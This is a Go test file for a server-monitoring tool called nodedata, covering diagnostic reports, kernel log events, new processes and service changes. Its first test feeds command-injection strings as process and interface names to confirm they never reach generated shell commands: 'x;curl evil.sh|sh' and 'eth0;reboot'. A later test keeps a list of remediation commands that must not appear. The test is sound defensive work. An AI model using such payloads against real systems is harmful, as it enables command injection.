package main

import (
	"math/rand"
	"strings"
	"testing"
	"time"

	"github.com/githubflyideas/nodedata/cmd/nodedata/check"
	"github.com/githubflyideas/nodedata/internal/collector"
	"github.com/githubflyideas/nodedata/internal/diagnosis"
)

// 进程名是任何人都能随便起的。拼进 shell 命令就是注入——跟 health.txt 那次是同一类坑。
// 命令里只能有 PID；名字只用来挑选命令集。
func TestNextStepsNeverInterpolateProcessName(t *testing.T) {
	evil := "x;curl evil.sh|sh"
	for _, res := range []string{"CPU", "内存", "磁盘"} {
		cmds := nextSteps(res, []cmpMover{{Name: evil, PID: 4242, Metric: "proc.cpu." + evil}}, "")
		if len(cmds) == 0 {
			t.Fatalf("%s 应给出命令", res)
		}
		sawPID := false
		for _, c := range cmds {
			if strings.Contains(c.Cmd, "evil") || strings.Contains(c.Cmd, "curl") {
				t.Errorf("%s 的命令里出现了进程名：%q", res, c.Cmd)
			}
			sawPID = sawPID || strings.Contains(c.Cmd, "4242")
		}
		if !sawPID {
			t.Errorf("%s 的命令应带上 PID", res)
		}
	}
	// 网卡名也按白名单校验
	for _, c := range nextSteps("网络", nil, "eth0;reboot") {
		if strings.Contains(c.Cmd, "reboot") {
			t.Errorf("非法网卡名进了命令：%q", c.Cmd)
		}
	}
}

// 重的命令必须标明开销；java 给 jstack；只给诊断，不给处置。
func TestNextStepsCostAndKind(t *testing.T) {
	cmds := nextSteps("CPU", []cmpMover{{Name: "java", PID: 7}}, "")
	joined := ""
	for _, c := range cmds {
		joined += c.Cmd + "\n"
		if (strings.HasPrefix(c.Cmd, "perf record") || strings.Contains(c.Cmd, "strace")) && c.Cost != costHeavy {
			t.Errorf("%q 是重命令，开销应标 %q，实为 %q", c.Cmd, costHeavy, c.Cost)
		}
	}
	if !strings.Contains(joined, "jstack 7") {
		t.Error("java 进程应给 jstack")
	}
	for _, bad := range []string{"kill", "renice", "ionice", "echo 3 >"} {
		if strings.Contains(joined, bad) {
			t.Errorf("出现了处置类命令 %q", bad)
		}
	}
}

// 报告的每一段都在，而且"没有变化"要明说。
func TestReportV2Sections(t *testing.T) {
	now := time.Date(2026, 9, 24, 14, 12, 40, 0, time.FixedZone("JST", 9*3600))
	rd := reportData{
		Host: "jp02-web-01", At: now, HaveChanges: true, SvcCount: 3,
		Machine: &machineInfo{Cores: 16, MemTotal: 64 << 30, Kernel: "5.15.0-119", Virt: "KVM",
			Disks: []string{"vda(虚拟盘)"}, Uptime: 41 * 24 * time.Hour},
		Learn: &learnInfo{Span: 5*24*time.Hour + 5*time.Hour, Usable: []string{"5分钟", "1天", "3天"}, Next: "7天", NextWait: 212 * time.Hour},
		Timeline: []tlEvent{
			{At: now.Add(-10 * time.Minute), What: "java(24117) CPU", From: "180%", To: "640%", First: true},
			{At: now.Add(-9 * time.Minute), What: "运行队列", From: "4", To: "19"},
		},
		Episodes: []changeLine{{At: now.Add(-42 * time.Hour), End: now.Add(-41*time.Hour - 48*time.Minute), Text: "TCP 重传 峰值 380/s(平时 5/s)"}},
		Rows: []UseRow{
			{Resource: "CPU", State: "异常", Level: 2,
				Facts:    []UseFact{{Label: "整机忙碌", Value: 71, Unit: "percent"}},
				Movers:   []cmpMover{{Name: "java", PID: 24117, Parent: "systemd", Now: 640, Unit: "percent"}},
				Commands: []NextCmd{{Cmd: "top -H -p 24117 -b -n1 | head -20", Cost: costZero, Why: "看线程"}}},
			{Resource: "内存", State: "正常", Facts: []UseFact{{Label: "已用", Value: 58, Unit: "percent"}},
				Checked: []string{"换出", "内存压力"}, L0Total: 8, L0Pass: 8},
		},
	}
	out := renderReport(rd)
	t.Log("\n" + out)
	for _, want := range []string{
		"机器 16核", "KVM", "vda(虚拟盘)", "开机 41天",
		"已攒 5.2天", "最长能跟3天前比", "跟7天前比还要 8.8天",
		"口径 平时=",
		"先后（本次从 14:02:40 开始", "java(24117) CPU 180% → 640%   ← 最先越线",
		"服务：没有出现、消失或重启（3 个服务在跑）", "进程：没有新进程",
		"内核日志：没有 OOM",
		"过去的事", "TCP 重传 峰值 380/s",
		"java(24117,父进程systemd) 640%",
		"下一步  top -H -p 24117", "# 零开销，看线程",
		"已查 换出、内存压力；硬阈值 8/8 通过",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("报告缺 %q", want)
		}
	}
	if n := len([]rune(out)); n > 1800 {
		t.Errorf("报告 %d 字符，超出预算", n)
	}
}

// 内核日志：只留值得写的，按开机时刻换算成墙钟，超出 72 小时的不要。
func TestKernelEvents(t *testing.T) {
	boot := int64(1_790_000_000)
	now := time.Unix(boot+10*86400, 0)
	lines := []string{
		"[100.000000] usb 1-1: new high-speed USB device",                                 // 不值得写
		"[" + itoa64(10*86400-3600) + ".000000] Out of memory: Killed process 991 (java)", // 1 小时前
		"[" + itoa64(10*86400-5*86400) + ".000000] EXT4-fs error (device sda1): x",        // 5 天前：超窗
	}
	ev := kernelEvents(lines, boot, now)
	if len(ev) != 1 || !strings.Contains(ev[0].Text, "Out of memory") {
		t.Fatalf("应只留 1 小时前那条 OOM：%+v", ev)
	}
	if got := now.Sub(ev[0].At); got != time.Hour {
		t.Errorf("时刻换算错了：差 %v", got)
	}
}

// 新进程：只列占着资源的，nodedata 自己不算。
func TestNewProcesses(t *testing.T) {
	now := time.Unix(1_790_000_000, 0)
	ps := []diagnosis.Proc{
		{PID: 8821, Comm: "rsync", Parent: "cron", StartTS: now.Unix() - 300, WriteBps: 400 << 20},
		{PID: 12, Comm: "sleep", StartTS: now.Unix() - 60},                  // 不占资源
		{PID: 9, Comm: "nd", StartTS: now.Unix() - 60, CPU: 50, Self: true}, // 自己
		{PID: 1, Comm: "mysqld", StartTS: now.Unix() - 30*86400, CPU: 80},   // 老进程
	}
	got := newProcesses(ps, now)
	if len(got) != 1 || !strings.Contains(got[0].Text, "rsync(8821) 启动，父进程 cron") {
		t.Fatalf("应只列 rsync：%+v", got)
	}
}

// 过去的事：3 天历史里 2 天前有一段 25 分钟的写等待尖峰（抽样点里只有一半，峰值里有）。
// 平稳的指标、只有小噪声的指标都不该冒出来。
func TestEpisodesFindPastSpikeOnly(t *testing.T) {
	d, s := newUseFixture(t, check.FullResult{})
	now := time.Date(2026, 9, 25, 12, 0, 0, 0, time.UTC)
	spike := now.Add(-48 * time.Hour)
	r := rand.New(rand.NewSource(5))
	for ts := now.Add(-72 * time.Hour); ts.Before(now); ts = ts.Add(coarseStep) {
		v := 3 + r.Float64()*0.4
		if !ts.Before(spike) && ts.Before(spike.Add(25*time.Minute)) {
			v = 40
			s.AddPeak("disk.await_w", ts.Unix(), 42)
		}
		s.AddCoarse([]collector.Sample{
			{MetricID: "disk.await_w", TS: ts, Value: v},
			{MetricID: "cpu.user", TS: ts, Value: 20 + r.Float64()*2}, // 小噪声
			{MetricID: "tcp.retrans", TS: ts, Value: 0},               // 平稳
		})
	}
	ep := d.episodes(now)
	if len(ep) != 1 {
		t.Fatalf("应找到恰好 1 段：%+v", ep)
	}
	if !ep[0].At.Equal(spike) || !strings.Contains(ep[0].Text, "写等待 峰值 42ms") {
		t.Errorf("时段或内容不对：%+v", ep[0])
	}
}

// 起点按幅度找：异常前零星的小偏离不能把起点往前串。
// v5.21 开发中用 |z| 找，演示机上报出的起点比进程启动还早两分多钟。
func TestOnsetIgnoresEarlierBlips(t *testing.T) {
	d, s := newUseFixture(t, check.FullResult{})
	now := time.Date(2026, 9, 25, 20, 19, 0, 0, time.UTC)
	jumpAt := now.Add(-100 * time.Second)
	for ts := now.Add(-26 * time.Hour); !ts.After(now); ts = ts.Add(10 * time.Second) {
		v := 2.5
		switch {
		case !ts.Before(jumpAt):
			v = 99
			if ts.Equal(jumpAt.Add(30 * time.Second)) {
				v = 40 // 中间掉回去一个点
			}
		case ts.After(now.Add(-5*time.Minute)) && ts.Unix()%30 == 0:
			v = 6 // 异常前的零星小偏离
		}
		sm := []collector.Sample{{MetricID: "cpu.user", TS: ts, Value: v}}
		s.Add(sm)
	}
	at, from, to, ok := d.onset("cpu.user", now)
	if !ok {
		t.Fatal("应找到起点")
	}
	if !at.Equal(jumpAt) {
		t.Errorf("起点应是 %s，实得 %s（被前面的小偏离串早了）", jumpAt.Format("15:04:05"), at.Format("15:04:05"))
	}
	if to != "99%" || from == "—" {
		t.Errorf("变化应写成 x → 99%%，实得 %s → %s", from, to)
	}
}

// 服务台账：nodedata 每次启动都会把看到的服务记一条"出现"作为基线，那不是变化。
func TestServiceChangesIgnoreRestartBaseline(t *testing.T) {
	l := NewServiceLog(t.TempDir()+"/s.jsonl", 14*24*time.Hour)
	t0 := time.Date(2026, 9, 20, 0, 0, 0, 0, time.UTC)
	ev := func(ts time.Time, kind, id string) {
		l.events = append(l.events, svcEvent{TS: ts.Unix(), Kind: kind, ID: id})
	}
	// 第一次启动：基线，不算
	ev(t0, evUp, "")
	ev(t0, evAppear, "MySQL:3306")
	ev(t0, evAppear, "Redis:6379")
	// 重启：两个老服务重新看见，一个新服务是停机期间出现的
	t1 := t0.Add(24 * time.Hour)
	ev(t1, evUp, "")
	ev(t1, evAppear, "MySQL:3306")
	ev(t1, evAppear, "Redis:6379")
	ev(t1, evAppear, "Nginx:80")
	// 运行期间：Redis 消失，又出现一个新服务
	ev(t1.Add(time.Hour), evVanish, "Redis:6379")
	ev(t1.Add(2*time.Hour), evAppear, "Caddy:443")

	got := l.ChangesSince(t0.Add(-time.Hour))
	var lines []string
	for _, c := range got {
		lines = append(lines, c.Kind+c.ID+map[bool]string{true: "(停机期间)", false: ""}[c.DuringDowntime])
	}
	want := []string{"+Nginx:80(停机期间)", "-Redis:6379", "+Caddy:443"}
	if strings.Join(lines, " ") != strings.Join(want, " ") {
		t.Errorf("服务变化应为 %v，实得 %v", want, lines)
	}
}
